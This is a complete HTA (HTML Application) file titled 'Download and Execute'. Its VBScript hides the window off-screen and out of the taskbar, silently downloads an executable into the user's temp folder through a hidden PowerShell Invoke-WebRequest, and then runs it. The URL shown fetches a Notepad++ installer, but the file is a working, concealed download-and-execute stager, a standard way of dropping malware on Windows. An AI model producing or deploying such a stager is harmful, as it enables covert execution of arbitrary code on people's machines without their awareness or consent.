<!DOCTYPE html>
<html>
<head>
  <title>Download and Execute</title>
  <HTA:APPLICATION
    ID="app"
    APPLICATIONNAME="Downloader"
    BORDER="none"
    BORDERSTYLE="normal"
    CAPTION="no"
    SHOWINTASKBAR="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
  />
  <script language="VBScript">
    Sub Window_OnLoad
      ' Hide the window by moving it off-screen
      window.moveTo -10000, -10000

      ' Create a shell object to run commands
      Set objShell = CreateObject("WScript.Shell")
      Set objFSO = CreateObject("Scripting.FileSystemObject")

      ' Define the temporary folder and download URL
      tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
      downloadUrl = "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.7.6/npp.8.7.6.Installer.x64.exe"
      fileName = "npp.8.7.6.Installer.x64.exe"
      downloadedFile = tempFolder & "\" & fileName

      ' Create a PowerShell command to download the file
      cmdCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""

      ' Run the command in the background and wait for it to complete
      objShell.Run cmdCommand, 0, True

      ' Check if the file exists before executing it
      If objFSO.FileExists(downloadedFile) Then
        ' Execute the downloaded file
        objShell.Run """" & downloadedFile & """", 1, False
      Else
        MsgBox "Download failed. The file does not exist.", vbCritical, "Error"
      End If

      ' Close the HTA window
      window.close()
    End Sub
  </script>
</head>
<body>
</body>
</html>
